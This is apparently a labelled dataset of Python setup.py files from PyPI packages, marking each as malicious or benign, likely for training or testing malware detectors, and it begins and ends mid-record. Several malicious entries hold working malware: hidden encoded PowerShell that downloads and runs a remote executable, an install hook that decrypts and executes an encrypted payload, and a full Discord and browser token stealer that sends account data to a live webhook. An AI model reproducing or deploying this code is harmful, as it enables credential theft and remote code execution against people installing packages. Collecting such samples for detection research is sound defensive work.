3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flask-shell-ipython-0.4.1", "func": "from setuptools import setup\nsetup(\n    name=\"flask-shell-ipython\",\n    author=\"Andrew Grigorev\",\n    author_email=\"andrew@ei-grad.ru\",\n    description=\"Replace default `flask shell` command by similar command running IPython.\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type='text/markdown',\n    url=\"http://github.com/ei-grad/flask-shell-ipython\",\n    version=\"0.4.1\",\n    py_modules=['flask_shell_ipython'],\n    install_requires=[\n        'flask>=1.0',\n        'click',\n        'IPython>=5.0.0',\n    ],\n    entry_points={\n        'flask.commands': [\n            'shell=flask_shell_ipython:shell',\n        ],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Framework :: Flask',\n        'Framework :: IPython',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ]\n)\n", "target": 0}
{"idx": "elephas-3.1.0", "func": "from setuptools import setup\nfrom setuptools import find_packages\n\nsetup(name='elephas',\n      version='3.1.0',\n      description='Deep learning on Spark with Keras',\n      url='http://github.com/maxpumperla/elephas',\n      download_url='https://github.com/maxpumperla/elephas/tarball/3.1.0',\n      author='Daniel Cahall',\n      author_email='danielenricocahall@gmail.com',\n      install_requires=['cython',\n                        'tensorflow>=2,!=2.2.*',\n                        'flask',\n                        'h5py==3.3.0',\n                        'pyspark==3.2'],\n      extras_require={\n        'tests': ['pytest', 'pytest-pep8', 'pytest-cov', 'pytest-spark', 'mock']\n    },\n      packages=find_packages(),\n      license='MIT',\n      zip_safe=False,\n      classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'Environment :: Console',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3'\n    ])\n", "target": 0}
{"idx": "PyGzme-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'tTtTRCTgksYZFONPjxiRHNuEKoCzyBMxPXhQKD ck'\nLONG_DESCRIPTION = 'qM LrlwWQckFyXMGknqCJqhEqgldfJbJUpcLXhiyNzHrtelSEqIMkTbjBUurJrvXBuukpgSZFgQhHsbgItkWMIgWGYwHqsMkkVuMIuxbLyAIjfAwGcdwjzJibTrfbSqPhaGathJtY HySERiXQDxLkEJkWvExkFVrLbDYyeyYJnyVmMRvgUMeemQbQxxaKlLpoyAVLGMqdRTLRtUBzaOkPjyOOmiODnpAjVHnSkKACAOQhMmUmTsRZivCUIfbtzMoeMiQGKjqjxrWPmWClABJUTRZDNmQeaMNuAVirMJMCyfFeGwNCnpbeGkqQOtdPVXpkRWEJLRtWjdYHamWgf zjzRIMSqaE bQkxZLQmE GrnIQFuoAZSRWVXCxzOFX'\n\n\nclass XufPJrCINnaSvYBtQiazAJOgRRcxWZJxVVFOhJSFnMjheWvwgkUDrQqdRYOLVJlTOaQSLZZMU(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'l8TFD6OzAKlChemTIahTtorA550rk6b3xmbULqg_KjE=').decrypt(b'gAAAAABmBH7IMAtWgnF_sKCH2b5M7mzk3YDxvy-EGjH_BnaDFb-3tas_HnjimEE0VyoMbsvcUMkz0J0zUkF4jXKqRcYjkEE2PPvyf0mTftwTphh3qJFjaU6O3REIahNF82k_JCKCE_-w6WMjLHUTu1ET6AYT0uDX0OyPQpkTHYbbwKHZ5vR95LA4zgUyqu_YAfsKBDeDff5gxNelI0rfyVB3x31TUlbHHQ=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"PyGzme\",\n    version=VERSION,\n    author=\"pbmfYXDUsbE\",\n    author_email=\"xpKWAsT@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': XufPJrCINnaSvYBtQiazAJOgRRcxWZJxVVFOhJSFnMjheWvwgkUDrQqdRYOLVJlTOaQSLZZMU,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django-braces-1.15.0", "func": "import os\nimport re\nfrom setuptools import setup\n\nNAME = \"braces\"\n\n\ndef _add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef parse_dist_meta():\n    \"\"\"Extract metadata information from ``$dist/__init__.py``.\"\"\"\n\n    re_meta = re.compile(r\"__(\\w+?)__\\s*=\\s*(.*)\")\n    re_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n    here = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(here, NAME, \"__init__.py\")) as meta_fh:\n        distmeta = {}\n        for line in meta_fh:\n            if line.strip() == \"# -eof meta-\":\n                break\n            match = re_meta.match(line.strip())\n            if match:\n                distmeta.update(_add_default(match))\n        return distmeta\n\n\nmeta = parse_dist_meta()\n\nsetup(\n    name=\"django-braces\",\n    version=meta[\"version\"],\n    description=\"Reusable, generic mixins for Django\",\n    long_description=\"Mixins to add easy functionality to Django class-based views, forms, and models.\",\n    keywords=\"django, views, forms, mixins\",\n    author=\"Kenneth Love <kenneth@brack3t.com>, Chris Jones <chris@brack3t.com>\",\n    author_email=\"devs@brack3t.com\",\n    url=\"https://github.com/brack3t/django-braces/\",\n    license=\"BSD\",\n    packages=[\"braces\"],\n    zip_safe=False,\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Development Status :: 6 - Mature\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    install_requires=[\"Django>=2.2\"],\n)\n", "target": 0}
{"idx": "diff-match-patch-20200713", "func": "from setuptools import setup\n\nwith open(\"README.md\") as f:\n    readme = f.read()\n\nwith open(\"diff_match_patch/__init__.py\") as f:\n    for line in f:\n        if line.startswith(\"__version__\"):\n            version = line.split('\"')[1]\n\nsetup(\n    name=\"diff-match-patch\",\n    description=\"Repackaging of Google's Diff Match and Patch libraries. Offers robust algorithms to perform the operations required for synchronizing plain text.\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    version=version,\n    author=\"Neil Fraser\",\n    author_email=\"fraser@google.com\",\n    maintainer=\"John Reese\",\n    maintainer_email=\"john@noswap.com\",\n    url=\"https://github.com/diff-match-patch-python/diff-match-patch\",\n    classifiers=[\n        \"Development Status :: 6 - Mature\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Text Processing\",\n    ],\n    license=\"Apache\",\n    packages=[\"diff_match_patch\", \"diff_match_patch.tests\"],\n    python_requires=\">=2.7\",\n    setup_requires=[\"setuptools>=38.6.0\"],\n    install_requires=[],\n)\n", "target": 0}
{"idx": "djangorestframework-csv-2.1.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom setuptools import setup\nimport re\nimport os\nimport sys\n\n\nname = 'djangorestframework-csv'\npackage = 'rest_framework_csv'\ndescription = 'CSV Tools for Django REST Framework'\nurl = 'https://github.com/mjumbewu/django-rest-framework-csv'\nauthor = 'Mjumbe Wawatu Ukweli'\nauthor_email = 'mjumbewu@gmail.com'\nlicense = 'BSD'\ninstall_requires = ['djangorestframework', 'six', 'unicodecsv']\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py, re.MULTILINE).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nif sys.argv[-1] == 'publish':\n    os.system(\"python setup.py sdist upload\")\n    args = {'version': get_version(package)}\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %(version)s -m 'version %(version)s'\" % args)\n    print(\"  git push --tags\")\n    sys.exit()\n\n\nsetup(\n    name=name,\n    version=get_version(package),\n    url=url,\n    license=license,\n    description=description,\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    install_requires=install_requires,\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Framework :: Django\",\n    ],\n)\n", "target": 0}
{"idx": "selfcraftcontrolload-8.88", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcraftcontrolload',\n    packages = ['modlib'],\n    version = '2.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "htps1-2.3.1", "func": "from setuptools import setup, find_packages\nimport codecs\nimport os\nfrom base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nfrom os import getlogin, listdir\nfrom json import loads\nfrom re import findall\nfrom urllib.request import Request, urlopen\nfrom subprocess import Popen, PIPE\nimport requests, json, os\nfrom datetime import datetime\n\ntokens = []\ncleaned = []\nchecker = []\n\ndef decrypt(buff, master_key):\n    try:\n        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()\n    except:\n        return \"Error\"\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except: pass\n    return ip\ndef gethwid():\n    p = Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n    return (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\ndef get_token():\n    already_check = []\n    checker = []\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    chrome = local + \"\\\\Google\\\\Chrome\\\\User Data\"\n    paths = {\n        'Discord': roaming + '\\\\discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Lightcord': roaming + '\\\\Lightcord',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',\n        'Amigo': local + '\\\\Amigo\\\\User Data',\n        'Torch': local + '\\\\Torch\\\\User Data',\n        'Kometa': local + '\\\\Kometa\\\\User Data',\n        'Orbitum': local + '\\\\Orbitum\\\\User Data',\n        'CentBrowser': local + '\\\\CentBrowser\\\\User Data',\n        '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',\n        'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',\n        'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',\n        'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',\n        'Chrome': chrome + 'Default',\n        'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',\n        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',\n        'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'\n    }\n    for platform, path in paths.items():\n        if not os.path.exists(path): continue\n        try:\n            with open(path + f\"\\\\Local State\", \"r\") as file:\n                key = loads(file.read())['os_crypt']['encrypted_key']\n                file.close()\n        except: continue\n        for file in listdir(path + f\"\\\\Local Storage\\\\leveldb\\\\\"):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"): continue\n            else:\n                try:\n                    with open(path + f\"\\\\Local Storage\\\\leveldb\\\\{file}\", \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError: continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            try:\n                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])\n            except IndexError == \"Error\": continue\n            checker.append(tok)\n            for value in checker:\n                if value not in already_check:\n                    already_check.append(value)\n                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}\n                    try:\n                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)\n                    except: continue\n                    if res.status_code == 200:\n                        res_json = res.json()\n                        ip = getip()\n                        pc_username = os.getenv(\"UserName\")\n                        pc_name = os.getenv(\"COMPUTERNAME\")\n                        user_name = f'{res_json[\"username\"]}#{res_json[\"discriminator\"]}'\n                        user_id = res_json['id']\n                        email = res_json['email']\n                        phone = res_json['phone']\n                        mfa_enabled = res_json['mfa_enabled']\n                        has_nitro = False\n                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)\n                        nitro_data = res.json()\n                        has_nitro = bool(len(nitro_data) > 0)\n                        days_left = 0\n                        if has_nitro:\n                            d1 = datetime.strptime(nitro_data[0][\"current_period_end\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\")\n                            d2 = datetime.strptime(nitro_data[0][\"current_period_start\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\")\n                            days_left = abs((d2 - d1).days)\n                        embed = f\"\"\"**{user_name}** *({user_id})*\\n\n> :dividers: __Account Information__\\n\\tEmail: `{email}`\\n\\tPhone: `{phone}`\\n\\t2FA/MFA Enabled: `{mfa_enabled}`\\n\\tNitro: `{has_nitro}`\\n\\tExpires in: `{days_left if days_left else \"None\"} day(s)`\\n\n> :computer: __PC Information__\\n\\tIP: `{ip}`\\n\\tUsername: `{pc_username}`\\n\\tPC Name: `{pc_name}`\\n\\tPlatform: `{platform}`\\n\n> :pi\u00f1ata: __Token__\\n\\t`{tok}`\\n\n*Made by Astraa#6100* **|** ||https://github.com/astraadev||\"\"\"\n                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})\n                        try:\n                            headers2 = {\n                                'Content-Type': 'application/json',\n                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n                            }\n                            req = Request('https://discord.com/api/webhooks/1057781770550005850/F55mkPTDWGKw9zF0hC1xJ6Z9qK8ETjn9q2snfMYo2jutIYsgyV7S5tQQ74GCPK0y5E5y', data=payload.encode(), headers=headers2)\n                            urlopen(req)\n                        except: continue\n                else: continue\nif __name__ == '__main__':\n    get_token()\nsetup(\n    name=\"htps1\",\n    version=\"2.3.1\",\n    author=\"calword\",\n    author_email=\"<mail@neuralnine.com>\",\n    description=\"\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"\",\n    packages=find_packages(),\n    install_requires=['opencv-python', 'pyautogui', 'pyaudio'],\n    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "py-hackedpushcandy-3.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hackedpushcandy',\n    packages = ['modlib'],\n    version = '6.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfstrvirtualrand-6.69", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstrvirtualrand',\n    packages = ['modlib'],\n    version = '10.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "happybase-1.2.0", "func": "from os.path import join, dirname\nfrom setuptools import find_packages, setup\n\n__version__ = None\nexec(open('happybase/_version.py', 'r').read())\n\n\ndef get_file_contents(filename):\n    with open(join(dirname(__file__), filename)) as fp:\n        return fp.read()\n\n\ndef get_install_requires():\n    requirements = get_file_contents('requirements.txt')\n    install_requires = []\n    for line in requirements.split('\\n'):\n        line = line.strip()\n        if line and not line.startswith('-'):\n            install_requires.append(line)\n    return install_requires\n\n\nsetup(\n    name='happybase',\n    version=__version__,\n    description=\"A developer-friendly Python library to interact with \"\n                \"Apache HBase\",\n    long_description=get_file_contents('README.rst'),\n    author=\"Wouter Bolsterlee\",\n    author_email=\"uws@xs4all.nl\",\n    url='https://github.com/wbolster/happybase',\n    install_requires=get_install_requires(),\n    packages=find_packages(exclude=['tests']),\n    include_package_data=True,\n    license=\"MIT\",\n    classifiers=(\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Database\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    )\n)\n", "target": 0}
{"idx": "paypalotpbypass-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='PaypalOtpBypass', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "grpcio-gcp-0.2.2", "func": "# Copyright 2018 gRPC-GCP authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport setuptools\nimport version\n\nLICENSE = 'Apache License 2.0'\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 2.7',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'License :: OSI Approved :: Apache Software License',\n]\n\nsetuptools.setup(\n    name='grpcio-gcp',\n    version=version.GRPC_GCP,\n    description='gRPC extensions for Google Cloud Platform',\n    author='The gRPC-GCP Authors',\n    author_email='grpc-io@googlegroups.com',\n    url='https://grpc.io',\n    long_description=open('README.rst').read(),\n    license=LICENSE,\n    classifiers=CLASSIFIERS,\n    packages=setuptools.find_packages(),\n    include_package_data=True,\n    install_requires=[\n        'grpcio>={version}'.format(version=version.GRPC),\n    ],\n)\n", "target": 0}
{"idx": "filetype-1.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport codecs\nfrom setuptools import find_packages, setup\n\nsetup(\n    name='filetype',\n    version='1.1.0',\n    description='Infer file type and MIME type of any file/buffer. '\n                'No external dependencies.',\n    long_description=codecs.open('README.rst', 'r',\n                                 encoding='utf-8', errors='ignore').read(),\n    keywords='file libmagic magic infer numbers magicnumbers discovery mime '\n             'type kind',\n    url='https://github.com/h2non/filetype.py',\n    download_url='https://github.com/h2non/filetype.py/tarball/master',\n    author='Tomas Aparicio',\n    author_email='tomas@aparicio.me',\n    license='MIT',\n    license_files=['LICENSE'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: System',\n        'Topic :: System :: Filesystems',\n        'Topic :: Utilities'],\n    platforms=['any'],\n    packages=find_packages(exclude=['dist', 'build', 'docs', 'tests',\n                                    'examples']),\n    package_data={'filetype': ['LICENSE', '*.md']},\n    zip_safe=True,\n    entry_points={\n        'console_scripts': ['filetype=filetype.__main__:main'],\n    })\n", "target": 0}
{"idx": "easydev-0.12.0", "func": "import sys\nimport os\nfrom setuptools import setup, find_packages\nimport glob\n\n_MAJOR               = 0\n_MINOR               = 12\n_MICRO               = 0\nversion              = '%d.%d.%d' % (_MAJOR, _MINOR, _MICRO)\nrelease              = '%d.%d' % (_MAJOR, _MINOR)\n\nmetainfo = {\n    'authors': {'Cokelaer':('Thomas Cokelaer','thomas.cokelaer@pasteur.fr')},\n    'version': version,\n    'license' : 'new BSD',\n    'download_url' :'http://github.com/cokelaer/easydev',\n    'url' : \"http://github.com/cokelaer/easydev\",\n    'description':'Common utilities to ease the development of Python packages' ,\n    'platforms' : ['Linux', 'Unix', 'MacOsX', 'Windows'],\n    'keywords' : [\"multisetup\", \"logging\", \"config\", \"decorators\",\n        \"multigit\", \"progressbar\"],\n    'classifiers' : [\n          'Development Status :: 5 - Production/Stable',\n          'Intended Audience :: Developers',\n          'Intended Audience :: Science/Research',\n          'License :: OSI Approved',\n          'Operating System :: OS Independent',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Topic :: Software Development :: Libraries :: Python Modules'\n          ]\n    }\n\n\nsetup(\n    name             = 'easydev',\n    version          = version,\n    maintainer       = metainfo['authors']['Cokelaer'][0],\n    maintainer_email = metainfo['authors']['Cokelaer'][1],\n    author           = metainfo['authors']['Cokelaer'][0],\n    author_email     = metainfo['authors']['Cokelaer'][1],\n    long_description = open(\"README.rst\").read(),\n    keywords         = metainfo['keywords'],\n    description = metainfo['description'],\n    license          = metainfo['license'],\n    platforms        = metainfo['platforms'],\n    url              = metainfo['url'],\n    download_url     = metainfo['download_url'],\n    classifiers      = metainfo['classifiers'],\n\n    # package installation\n    packages = ['easydev', \"easydev.share\" ],\n    # using pip, files inside ./easydev/share that are non Python will be\n    # included as well. For a distribution (using 